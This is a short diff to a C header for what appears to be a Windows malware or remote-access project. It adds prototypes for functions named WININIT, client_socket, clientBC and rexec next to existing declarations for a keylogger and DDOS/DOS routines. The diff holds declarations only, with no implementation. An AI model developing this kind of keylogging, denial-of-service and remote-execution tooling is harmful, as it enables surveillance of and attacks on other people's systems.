@@ -5,6 +5,8 @@
 
 #if defined(_WIN32)
 
+int WININIT(void);
+
 char* keylogger(void);
 void DDOS(void);
 void DOS(void);
@@ -25,5 +27,12 @@ typedef struct
 	enum USTATUS STATUS;
 
 } userinfo;
+
+#endif
+
+
+SOCKET client_socket(void);
+int clientBC(void);
+int rexec(void);
 
 #endif
